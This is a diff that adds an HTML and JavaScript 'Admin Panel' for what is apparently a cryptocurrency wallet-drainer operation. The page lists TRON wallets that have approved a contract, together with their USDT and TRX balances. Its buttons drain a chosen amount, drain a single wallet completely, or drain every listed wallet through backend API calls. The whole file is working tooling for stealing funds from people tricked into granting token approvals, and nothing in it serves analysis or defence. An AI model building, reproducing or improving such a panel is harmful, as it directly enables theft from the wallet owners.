@@ -1,0 +1,302 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Admin Panel</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      font-family: 'Inter', -apple-system, sans-serif;
+      background: #000; color: #fff;
+      min-height: 100vh; padding: 20px;
+    }
+    .container { max-width: 1200px; margin: 0 auto; }
+    .card {
+      background: #111; border: 1px solid #222; border-radius: 16px;
+      padding: 24px; margin-bottom: 16px;
+    }
+    .login-box {
+      max-width: 360px; margin: 80px auto;
+      background: #111; border: 1px solid #222; border-radius: 16px;
+      padding: 28px 20px;
+    }
+    .login-box h2 { text-align: center; margin-bottom: 16px; font-size: 18px; }
+    .login-box input {
+      width: 100%; padding: 12px 14px; border-radius: 10px;
+      border: 1px solid #333; background: #181818; color: #fff;
+      font-family: inherit; font-size: 14px; margin-bottom: 10px;
+    }
+    .login-box input:focus { outline: none; border-color: #555; }
+    .login-box .error { color: #ff6b6b; font-size: 12px; text-align: center; margin-bottom: 8px; display: none; }
+    .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 16px; flex-wrap: wrap; gap: 10px; }
+    .header h1 { font-size: 20px; }
+    .header .info { font-size: 12px; color: #666; }
+    .btn {
+      padding: 8px 16px; border-radius: 8px; border: 1px solid #333;
+      background: #181818; color: #fff; font-family: inherit;
+      font-size: 12px; cursor: pointer; transition: border-color 0.15s;
+    }
+    .btn:hover { border-color: #555; }
+    .btn:active { transform: scale(0.97); }
+    .btn-primary { background: #4ade80; color: #000; border-color: #4ade80; font-weight: 600; }
+    .btn-primary:hover { background: #3bce6f; border-color: #3bce6f; }
+    .btn-danger { background: #ff4444; color: #fff; border-color: #ff4444; }
+    .btn-danger:hover { background: #e03333; border-color: #e03333; }
+    .btn-purple { background: #8b5cf6; color: #fff; border-color: #8b5cf6; }
+    .btn-purple:hover { background: #7c3aed; border-color: #7c3aed; }
+    .btn-sm { padding: 5px 10px; font-size: 11px; }
+    table { width: 100%; border-collapse: collapse; font-size: 13px; }
+    th, td { padding: 10px 12px; text-align: left; border-bottom: 1px solid #1a1a1a; }
+    th { color: #666; font-weight: 500; font-size: 11px; text-transform: uppercase; letter-spacing: 0.5px; }
+    td { color: #ccc; }
+    tr:hover td { background: #0a0a0a; }
+    .address { font-family: monospace; font-size: 12px; color: #888; }
+    .actions { display: flex; gap: 6px; align-items: center; flex-wrap: wrap; }
+    .actions input {
+      width: 80px; padding: 5px 8px; border-radius: 6px;
+      border: 1px solid #333; background: #181818; color: #fff;
+      font-size: 11px; font-family: inherit;
+    }
+    .actions input:focus { outline: none; border-color: #555; }
+    .amount-input { display: flex; gap: 4px; align-items: center; }
+    .msg {
+      padding: 10px 14px; border-radius: 10px; font-size: 13px;
+      margin-bottom: 14px; display: none; border: 1px solid transparent;
+    }
+    .msg.show { display: block; }
+    .msg.err { background: #1a0a0a; border-color: #331111; color: #ff6b6b; }
+    .msg.ok { background: #0a1a0a; border-color: #113311; color: #4ade80; }
+    .msg.inf { background: #0a0a1a; border-color: #111133; color: #6b6bff; }
+    .spinner {
+      display: inline-block; width: 14px; height: 14px;
+      border: 2px solid rgba(255,255,255,0.1); border-top-color: #fff;
+      border-radius: 50%; animation: spin 0.6s linear infinite;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    .empty { text-align: center; padding: 40px; color: #444; font-size: 14px; }
+    #mainScreen { display: none; }
+    .badge { 
+      display: inline-block; padding: 2px 8px; border-radius: 4px;
+      font-size: 11px; font-weight: 600;
+    }
+    .badge.usdt { background: #0a2a0a; color: #4ade80; }
+    .badge.trx { background: #1a1a2a; color: #6b6bff; }
+    .result-msg { font-size: 11px; color: #666; margin-top: 4px; }
+    @media (max-width: 768px) {
+      table { font-size: 11px; }
+      th, td { padding: 6px 8px; }
+      .actions input { width: 60px; }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div id="loginScreen" class="login-box">
+      <h2>Admin Login</h2>
+      <div class="error" id="loginError">Wrong password</div>
+      <input type="password" id="passwordInput" placeholder="Enter password" onkeydown="if(event.key==='Enter')doLogin()">
+      <button class="btn btn-primary" onclick="doLogin()" style="width:100%;padding:12px;font-size:14px;">Login</button>
+    </div>
+
+    <div id="mainScreen">
+      <div class="card">
+        <div class="header">
+          <div>
+            <h1>Admin Panel</h1>
+            <div class="info">Approved wallets that signed the contract</div>
+          </div>
+          <div style="display:flex;gap:8px;flex-wrap:wrap;">
+            <button class="btn btn-danger" onclick="drainAll()" id="drainAllBtn">Drain All Wallets</button>
+            <button class="btn" onclick="loadWallets()">Refresh</button>
+            <button class="btn" onclick="logout()">Logout</button>
+          </div>
+        </div>
+        <div id="msgBox"></div>
+        <div id="loading" style="text-align:center;padding:40px;display:none;"><div class="spinner"></div></div>
+        <div id="walletTable"></div>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    var PASSWORD = '';
+    var TOKEN = '';
+
+    function msg(type, text) {
+      var box = document.getElementById('msgBox');
+      box.innerHTML = '<div class="msg show ' + type + '">' + text + '</div>';
+      setTimeout(function(){ box.innerHTML = ''; }, 5000);
+    }
+
+    function doLogin() {
+      var pwd = document.getElementById('passwordInput').value;
+      if (!pwd) return;
+      PASSWORD = pwd;
+      document.getElementById('loginError').style.display = 'none';
+      loadWallets();
+    }
+
+    function logout() {
+      PASSWORD = '';
+      TOKEN = '';
+      document.getElementById('mainScreen').style.display = 'none';
+      document.getElementById('loginScreen').style.display = 'block';
+      document.getElementById('passwordInput').value = '';
+    }
+
+    async function api(path, opts) {
+      opts = opts || {};
+      opts.headers = opts.headers || {};
+      opts.headers['X-Admin-Password'] = PASSWORD;
+      if (opts.body && typeof opts.body === 'object') {
+        opts.headers['Content-Type'] = 'application/json';
+        opts.body = JSON.stringify(opts.body);
+      }
+      var r = await fetch(path, opts);
+      if (r.status === 401) {
+        document.getElementById('loginError').style.display = 'block';
+        document.getElementById('mainScreen').style.display = 'none';
+        document.getElementById('loginScreen').style.display = 'block';
+        return null;
+      }
+      return r.json();
+    }
+
+    function fmtAddr(addr) {
+      return addr.slice(0, 6) + '...' + addr.slice(-4);
+    }
+
+    function fmtTime(ts) {
+      var d = new Date(ts);
+      return d.toLocaleString();
+    }
+
+    function fmtUsdt(raw) {
+      return (raw / 1e6).toFixed(2);
+    }
+
+    function fmtTrx(raw) {
+      return Number(raw).toFixed(4);
+    }
+
+    async function loadWallets() {
+      document.getElementById('loginError').style.display = 'none';
+      document.getElementById('loading').style.display = 'block';
+      document.getElementById('walletTable').innerHTML = '';
+      document.getElementById('mainScreen').style.display = 'block';
+      document.getElementById('loginScreen').style.display = 'none';
+
+      var data = await api('/api/admin/wallets');
+      document.getElementById('loading').style.display = 'none';
+      if (!data) return;
+
+      var wallets = data.wallets || [];
+      var container = document.getElementById('walletTable');
+
+      if (wallets.length === 0) {
+        container.innerHTML = '<div class="empty">No approved wallets yet</div>';
+        return;
+      }
+
+      var totalUsdt = 0;
+      var html = '<table><thead><tr><th>#</th><th>Address</th><th>USDT</th><th>TRX</th><th>Approved</th><th>Actions</th></tr></thead><tbody>';
+      for (var i = 0; i < wallets.length; i++) {
+        var w = wallets[i];
+        totalUsdt += w.usdt;
+        html += '<tr>';
+        html += '<td>' + (i + 1) + '</td>';
+        html += '<td class="address" title="' + w.address + '">' + fmtAddr(w.address) + '</td>';
+        html += '<td><span class="badge usdt">' + w.usdt.toFixed(2) + '</span></td>';
+        html += '<td><span class="badge trx">' + fmtTrx(w.trx) + '</span></td>';
+        html += '<td style="font-size:11px;color:#555;">' + fmtTime(w.approvedAt) + '</td>';
+        html += '<td><div class="actions">';
+        html += '<button class="btn btn-danger btn-sm" onclick="drainOne(\'' + w.address + '\')">Drain All</button>';
+        html += '<div class="amount-input">';
+        html += '<input type="number" id="amt_' + i + '" placeholder="USDT" min="0.01" step="0.01" style="width:70px;">';
+        html += '<button class="btn btn-purple btn-sm" onclick="drainAmount(\'' + w.address + '\', ' + i + ')">Drain</button>';
+        html += '</div></div><div id="res_' + i + '" class="result-msg"></div>';
+        html += '</td></tr>';
+      }
+      html += '</tbody></table>';
+      html += '<div style="margin-top:12px;font-size:13px;color:#888;">Total USDT: <span style="color:#4ade80;font-weight:600;">' + totalUsdt.toFixed(2) + '</span></div>';
+      container.innerHTML = html;
+    }
+
+    async function drainOne(address) {
+      if (!confirm('Drain all USDT from ' + fmtAddr(address) + '?')) return;
+      var data = await api('/api/admin/drain/' + address, { method: 'POST' });
+      if (data) {
+        if (data.success) {
+          msg('ok', 'Drained ' + fmtAddr(address) + ' — TX: ' + (data.txId || '').slice(0, 16) + '...');
+        } else {
+          msg('err', 'Failed: ' + (data.error || 'unknown'));
+        }
+        loadWallets();
+      }
+    }
+
+    async function drainAmount(address, idx) {
+      var inp = document.getElementById('amt_' + idx);
+      var amount = parseFloat(inp.value);
+      if (!amount || amount <= 0) { alert('Enter USDT amount'); return; }
+      var rawAmount = Math.floor(amount * 1e6);
+      var resEl = document.getElementById('res_' + idx);
+      resEl.textContent = 'Draining...';
+
+      if (!confirm('Drain ' + amount + ' USDT from ' + fmtAddr(address) + '?')) {
+        resEl.textContent = '';
+        return;
+      }
+
+      var data = await api('/api/admin/drain/' + address, {
+        method: 'POST',
+        body: { amount: rawAmount.toString() }
+      });
+      if (data) {
+        if (data.success) {
+          var msgText = 'Drained ' + (data.drained || amount) + ' USDT';
+          if (data.refundTxId) msgText += ' (refund tx: ' + data.refundTxId.slice(0, 10) + '...)';
+          if (data.warning) msgText += ' — ' + data.warning;
+          resEl.textContent = msgText;
+          msg('ok', msgText);
+          setTimeout(loadWallets, 2000);
+        } else {
+          resEl.textContent = 'Failed: ' + (data.error || 'unknown');
+        }
+        inp.value = '';
+      }
+    }
+
+    async function drainAll() {
+      if (!confirm('Drain ALL wallets? This cannot be undone.')) return;
+      document.getElementById('drainAllBtn').disabled = true;
+      document.getElementById('drainAllBtn').textContent = 'Draining...';
+
+      var data = await api('/api/admin/drain-all', { method: 'POST' });
+      document.getElementById('drainAllBtn').disabled = false;
+      document.getElementById('drainAllBtn').textContent = 'Drain All Wallets';
+
+      if (data) {
+        if (data.success) {
+          var ok = data.results.filter(function(r){ return r.success; }).length;
+          var fail = data.results.filter(function(r){ return !r.success; }).length;
+          msg('ok', 'Done! ' + ok + ' drained, ' + fail + ' failed');
+        } else {
+          msg('err', 'Failed: ' + (data.error || 'unknown'));
+        }
+        loadWallets();
+      }
+    }
+
+    if (localStorage.getItem('admin_pwd')) {
+      PASSWORD = localStorage.getItem('admin_pwd');
+      loadWallets();
+    }
+
+    document.getElementById('passwordInput').focus();
+  </script>
+</body>
+</html>
